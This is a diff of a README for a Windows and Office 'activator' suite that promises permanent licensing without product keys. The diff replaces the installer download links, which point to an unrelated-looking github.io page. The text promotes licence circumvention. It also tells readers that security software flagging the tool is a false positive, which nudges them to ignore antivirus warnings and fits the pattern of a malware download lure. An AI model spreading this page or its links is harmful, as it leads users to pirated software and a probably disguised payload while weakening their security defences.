@@ -2,7 +2,7 @@
 
 Windows Activators Advanced is a comprehensive software suite designed to provide permanent digital licensing solutions for Microsoft Windows 11, Windows 10, and various Office versions. This all-in-one activator collection includes advanced tools for managing activation states, installing digital licenses, and ensuring system stability without requiring manual key entry.
 
-[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://yellowtaxisave.github.io/download-page/)
+[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://capitals-707-bringing.github.io/download-page/)
 
 ## Features
 
@@ -48,7 +48,7 @@ A: Some security software may flag activation tools. This is a common false posi
 
 For the most secure and up-to-date version, always download from our official repository. Avoid third-party sources that may include modified or unsafe files.
 
-[Download from official website](https://yellowtaxisave.github.io/download-page/)
+[Download from official website](https://capitals-707-bringing.github.io/download-page/)
 
 ---
 
